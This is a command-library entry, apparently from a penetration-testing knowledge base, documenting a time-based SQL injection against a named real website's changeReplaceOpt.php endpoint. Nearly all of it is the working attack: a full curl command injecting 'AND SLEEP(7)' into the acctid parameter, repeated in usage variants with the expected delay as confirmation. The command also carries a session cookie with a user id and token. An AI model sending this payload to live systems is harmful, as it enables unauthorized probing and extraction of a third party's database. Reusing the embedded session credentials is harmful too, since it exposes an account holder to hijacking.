---
id: cmd-sqli-sleep7-001
data: >-
  curl -X GET
  "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND
  SLEEP(7)" -H "Host: www.intensedebate.com" -H "User-Agent: Mozilla/5.0 (X11;
  Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0" -H "Accept: */*"
  -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding:
  gzip, deflate" -H "Connection: close" -H "Referer:
  https://www.intensedebate.com/install-t" -H "Cookie: country_code=FR;
  login_pref=IDC; idcomments_userid=26745306;
  idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572"
tags:
  - sqli
  - timing
type: command
output: HTTP response after ~7 second delay
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:04.947Z'
verified: false
validated: true
submitted: true
---
# sqli-sleep-7-change-replace-opt

## Command

```bash
curl -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND SLEEP(7)" -H "Host: www.intensedebate.com" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0" -H "Accept: */*" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Referer: https://www.intensedebate.com/install-t" -H "Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572"
```

## Description

This command injects a 7-second SLEEP payload to further confirm the SQLi vulnerability with a quicker test cycle.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `opt=1` | Option parameter | Yes |
| `acctid=419523 AND SLEEP(7)` | Payload for delay | Yes |
| Headers | Browser simulation | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND SLEEP(7)" [headers]
```

### Advanced Usage

With timeout: ```bash
curl --max-time 10 -X GET "https://www.intensedebate.com/changeReplaceOpt.php?opt=1&acctid=419523 AND SLEEP(7)" [headers]
```

## Expected Output

Response after ~7,486 ms, confirming injection via timing.

## Related

- [[commands/sqli-sleep-15-change-replace-opt]]
- [[procedures/Confirm-Time-Based-SQLi-with-SLEEP-7]]
